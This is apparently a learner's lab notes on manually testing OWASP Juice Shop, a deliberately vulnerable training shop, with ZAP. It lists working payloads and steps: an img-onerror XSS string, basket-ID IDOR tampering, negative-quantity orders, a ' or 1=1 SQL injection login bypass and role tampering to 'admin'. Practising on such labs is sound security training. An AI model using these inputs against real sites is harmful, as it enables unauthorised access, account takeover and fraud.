# Manual Testing – Juice Shop

## Initial Exploration

- Start by using the website **like a normal user**.
    
- Observe **all backend requests** in ZAP’s proxy history.
    
- Never enter **real personal data** when registering.
    

---
## Account Creation

- The registration process hits:  
    `POST /api/Users/`  
    With payload:
    
    ```json
    {
      "email": "bob@bob.com",
      "password": "test123",
      "passwordRepeat": "test123",
      "securityQuestion": {
        "id": 7,
        "question": "Name of your favorite pet?",
        "createdAt": "...",
        "updatedAt": "..."
      },
      "securityAnswer": "test123"
    }
    ```
    
- Endpoint `/api/SecurityQuestions/` is used — a useful feature to inspect further.
    
---
## Vulnerabilities

### 1. Reflected XSS in Search Field

- A visible `search` parameter in the URL reflects input on the page.
    
- `<script>` blocked, but XSS worked via:
    
    ```html
    <img src=x onerror="alert(1)">
    ```
    
---
### 2. IDOR – Basket Manipulation

#### 2.1 Viewing Another User’s Cart

- When adding an item to your cart, the app makes a request like:  
    `GET /rest/basket/6`
    
- Manually changing the ID to `/rest/basket/5` revealed another user's cart — a classic **IDOR vulnerability**.

---
#### 2.2 Adding Items to Another User’s Cart

- The response from the `PUT` request for adding items to the cart contains a `BasketId`, so you cold place it in the request with another user's value
    
```json
{   
"ProductId": 1,
"BasketId": "7",
"quantity": 1 
}
```
    
- Challenge: **Manipulate Basket** – Add a product to another user's basket.
    
---
#### 2.3 Placing a Purchase Without Paying

- Try setting a **negative quantity** like `-100` when adding an item:
    
    ```json
    {
      "ProductId": 1,
      "BasketId": "7",
      "quantity": -100
    }
    ```
    
- This triggers a logic flaw that solves the challenge:  
    **Payback Time** – Place an order that makes you rich.

---
### 3. Potential Stored XSS in Address Field

- During checkout, address form is a good candidate for injection.
    
- Test for **stored XSS**, SQLi, or other payloads.
    

---
### 4. Potential IDOR

- Try manually altering IDs in URLs like:
    
    - `/address/7`
        
    - `/basket/7`
        
    - `/order/7`
        

---
### 5. SQLi in Login

- JSON-based login → test SQLi payload:
    
```sql
' or 1=1; -- 
```
    
- Works in **email** and possibly **password** fields.
    
- Challenge: **Login Admin** – Log in as administrator.
    

---
### 6. Admin Privilege Escalation

- On user registration response:
    
    ```json
    "role": "customer"
    ```
    
- Modify and resend registration request while creating a new user:
    
    ```json
    "role": "admin"
    ```
    
- Challenge solved: **Admin Registration**

---
### 7. Hidden Admin Panel

- Accessible via: `http://ubuntu-server:8002/#/administration`
    
- Handled entirely on the **client-side** through **Angular routing**.
    
- Anything after `#` is processed by the frontend, not the server. So you will not be able to fuzz this part throw ZAP for example.
        
- Can be discovered through **manual fuzzing** after logging in as admin.

---
### Tips

- **Keep browser console open** — useful for dynamic JS apps.
    
- **Look at all user-controlled inputs**.
    
- Always test:
    
    - IDOR
        
    - Reflected XSS
        
    - SQLi
        
    - Logic flaws (negative values, role tampering)